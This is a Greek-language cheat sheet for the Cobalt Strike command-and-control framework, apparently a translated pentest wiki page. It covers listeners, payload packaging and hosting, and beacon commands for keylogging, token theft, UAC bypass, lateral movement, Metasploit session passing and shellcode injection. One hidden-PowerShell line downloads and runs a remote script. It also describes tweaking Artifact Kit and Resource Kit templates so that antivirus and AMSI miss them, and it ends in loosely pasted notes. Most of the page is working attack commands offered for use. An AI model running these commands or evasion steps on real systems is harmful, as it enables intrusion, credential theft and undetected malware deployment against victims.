# Cobalt Strike

### Ακροατές

### C2 Ακροατές

`Cobalt Strike -> Ακροατές -> Προσθήκη/Επεξεργασία` και μπορείτε να επιλέξετε πού να ακούσετε, ποιον τύπο beacon να χρησιμοποιήσετε (http, dns, smb...) και άλλα.

### Ακροατές Peer2Peer

Τα beacons αυτών των ακροατών δεν χρειάζεται να επικοινωνούν απευθείας με το C2, μπορούν να επικοινωνούν μέσω άλλων beacons.

`Cobalt Strike -> Ακροατές -> Προσθήκη/Επεξεργασία` και χρειάζεται να επιλέξετε τα beacons TCP ή SMB

* Το **TCP beacon θα ορίσει έναν ακροατή στην επιλεγμένη θύρα**. Για να συνδεθείτε σε ένα TCP beacon χρησιμοποιήστε την εντολή `connect <ip> <port>` από ένα άλλο beacon
* Το **smb beacon θα ακούσει σε ένα pipename με το επιλεγμένο όνομα**. Για να συνδεθείτε σε ένα SMB beacon χρειάζεται να χρησιμοποιήσετε την εντολή `link [target] [pipe]`.

### Δημιουργία και φιλοξενία payloads

#### Δημιουργία payloads σε αρχεία

`Επιθέσεις -> Πακέτα ->`&#x20;

* **`HTMLApplication`** για αρχεία HTA
* **`MS Office Macro`** για ένα εγγραφο γραφείου με μακρό
* **`Windows Executable`** για ένα .exe, .dll ή .exe υπηρεσίας
* **`Windows Executable (S)`** για ένα **stageless** .exe, .dll ή .exe υπηρεσίας (καλύτερο stageless από staged, λιγότερα IoCs)

#### Δημιουργία και φιλοξενία payloads

`Επιθέσεις -> Web Drive-by -> Scripted Web Delivery (S)` Αυτό θα δημιουργήσει ένα script/executable για να κατεβάσει το beacon από το cobalt strike σε μορφές όπως: bitsadmin, exe, powershell και python

#### Φιλοξενία Payloads

Αν ήδη έχετε το αρχείο που θέλετε να φιλοξενήσετε σε έναν διακομιστή ιστού, απλά πηγαίνετε στο `Επιθέσεις -> Web Drive-by -> Host File` και επιλέξτε το αρχείο που θέλετε να φιλοξενήσετε και τη διαμόρφωση του διακομιστή ιστού.

### Επιλογές Beacon

<pre class="language-bash"><code class="lang-bash"># Εκτέλεση τοπικού .NET binary
execute-assembly &#x3C;/path/to/executable.exe>

# Στιγμιότυπα οθόνης
printscreen    # Πάρτε ένα μόνο στιγμιότυπο οθόνης μέσω της μεθόδου PrintScr
screenshot     # Πάρτε ένα μόνο στιγμιότυπο οθόνης
screenwatch    # Πάρτε περιοδικά στιγμιότυπα οθόνης
## Πηγαίνετε στο Προβολή -> Στιγμιότυπα οθόνης για να τα δείτε

# keylogger
keylogger [pid] [x86|x64]
## Προβολή > Πλήκτρα για να δείτε τα πατημένα πλήκτρα

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Ενσωμάτωση δράσης portscan μέσα σε άλλη διεργασία
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Εισαγωγή Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;γράψτε εδώ powershell cmd>

# Προσομοίωση χρήστη
## Δημιουργία διαπιστευτηρίων με creds
make_token [DOMAIN\user] [password] # Δημιουργία διαπιστευτηρίων για προσομοίωση ενός χρήστη στο δίκτυο
ls \\computer_name\c$ # Δοκιμάστε να χρησιμοποιήσετε τα δημιουργημένα διαπιστευτήρια για πρόσβαση στο C$ σε έναν υπολογιστή
rev2self # Σταματήστε τη χρήση των διαπιστευτηρίων που δημιουργήθηκαν με το make_token
## Η χρήση του make_token δημιουργεί το γεγονός 4624: Ένας λογαριασμός συνδέθηκε με επιτυχία. Αυτό το γεγονός είναι πολύ συνηθισμένο σε ένα τομέα Windows, αλλά μπορεί να περιοριστεί με φιλτράρισμα στον τύπο σύνδεσης. Όπως αναφέρθηκε παραπάνω, χρησιμοποιεί το LOGON32_LOGON_NEW_CREDENTIALS που είναι τύπος 9.

# UAC Bypass
elevate svc-exe &#x3C;ακροατής>
elevate uac-token-duplication &#x3C;ακροατής>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Κλέψτε το token από το pid
## Όπως το make_token αλλά κλέβει το token από μια διεργασία
steal_token [pid] # Επίσης, αυτό είναι χρήσιμο για δικτυακές ενέργειες, όχι τ
### Δημιουργία νέας συνεδρίας σύνδεσης, σημειώστε το luid και το processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Εισαγωγή εισιτηρίου στη δημιουργημένη συνεδρία σύνδεσης
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Τέλος, κλέψτε το token από αυτήν τη νέα διεργασία
steal_token &#x3C;pid>

# Πλευρική κίνηση
## Εάν δημιουργήθηκε ένα token, θα χρησιμοποιηθεί
jump [method] [target] [listener]
## Μέθοδοι:
## psexec                    x86   Χρησιμοποιήστε ένα υπηρεσία για να εκτελέσετε ένα αρχείο EXE υπηρεσίας
## psexec64                  x64   Χρησιμοποιήστε ένα υπηρεσία για να εκτελέσετε ένα αρχείο EXE υπηρεσίας
## psexec_psh                x86   Χρησιμοποιήστε ένα υπηρεσία για να εκτελέσετε ένα PowerShell one-liner
## winrm                     x86   Εκτελέστε ένα σενάριο PowerShell μέσω WinRM
## winrm64                   x64   Εκτελέστε ένα σενάριο PowerShell μέσω WinRM

remote-exec [method] [target] [command]
## Μέθοδοι:
<strong>## psexec                          Απομακρυσμένη εκτέλεση μέσω του Service Control Manager
</strong>## winrm                           Απομακρυσμένη εκτέλεση μέσω WinRM (PowerShell)
## wmi                             Απομακρυσμένη εκτέλεση μέσω WMI

## Για να εκτελέσετε ένα beacon με wmi (δεν είναι στην εντολή jump) απλά ανεβάστε το beacon και εκτελέστε το
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Παράδοση συνεδρίας στο Metasploit - Μέσω listener
## Στον υπολογιστή με το metasploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Στο cobalt: Listeners > Add και ορίστε το Payload σε Foreign HTTP. Ορίστε το Host σε 10.10.5.120, τη θύρα σε 8080 και κάντε κλικ στο Save.
beacon> spawn metasploit
## Μπορείτε να εκκινήσετε μόνο συνεδρίες x86 Meterpreter με τον ξένο ακροατή.

# Παράδοση συνεδρίας στο Metasploit - Μέσω εισαγωγής shellcode
## Στον υπολογιστή με το metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Εκτελέστε το msfvenom και προετοιμάστε τον ακροατή multi/handler

## Αντιγράψτε το αρχείο bin στον υπολογιστή του cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Εισαγωγή του shellcode του metasploit σε μια διεργασία x64

# Παράδοση συνεδρίας metasploit στο cobalt strike
## Δημιουργία stageless Beacon shellcode, πηγαίνετε σε Attacks > Packages > Windows Executable (S), επιλέξτε τον επιθυμητό ακροατή, επιλέξτε τον τύπο εξόδου Raw και επιλέξτε τη χρήση του x64 payload.
## Χρησιμοποιήστε το post/windows/manage/shellcode_inject στο metasploit για να εισαγάγετε τον δημιουργημένο κώδικα shellcode του cobalt strike


# Περιστροφή
## Ανοίξτε ένα socks proxy στο teamserver
beacon> socks 1080

# Σύνδεση SSH
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Αποφυγή των AVs

### Artifact Kit

Συνήθως στο `/opt/cobaltstrike/artifact-kit` μπορείτε να βρείτε τον κώδικα και τα προεπιλεγμένα πρότυπα (στο `/src-common`) των φορτίων που θα χρησιμοποιήσει το cobalt strike για να δημιουργήσει τα δυαδικά beacons.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με το δημιουργημένο backdoor (ή απλά με το προεπιλεγμένο πρότυπο) μπορείτε να βρείτε τον λόγο που ενεργοποιεί τον defender. Συνήθως είναι μια συμβολοσειρά. Επομένως, μπορείτε απλά να τροποποιήσετε τον κώδικα που δημιουργεί το backdoor έτσι ώστε αυτή η συμβολοσειρά να μην εμφανίζεται στο τελικό δυαδικό.

Μετά την τροποποίηση του κώδικα, απλά εκτελέστε `./build.sh` από τον ίδιο φάκελο και αντιγράψτε τον φάκελο `dist-pipe/` στον πελάτη Windows στο `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Μην ξεχάσετε να φορτώσετε το επιθετικό script `dist-pipe\artifact.cna` για να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

### Συλλογή Εργαλείων

Ο φάκελος ResourceKit περιέχει τα πρότυπα για τα φορτία βασισμένα σε σενάρια του Cobalt Strike, συμπεριλαμβανομένων των PowerShell, VBA και HTA.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με τα πρότυπα, μπορείτε να βρείτε τι δεν αρέσει στον ανιχνευτή (AMSI σε αυτήν την περίπτωση) και να το τροποποιήσετε:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Τροποποιώντας τις ανιχνευμένες γραμμές μπορούμε να δημιουργήσουμε ένα πρότυπο που δεν θα ανιχνευθεί.

Μην ξεχάσετε να φορτώσετε το επιθετικό script `ResourceKit\resources.cna` για να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

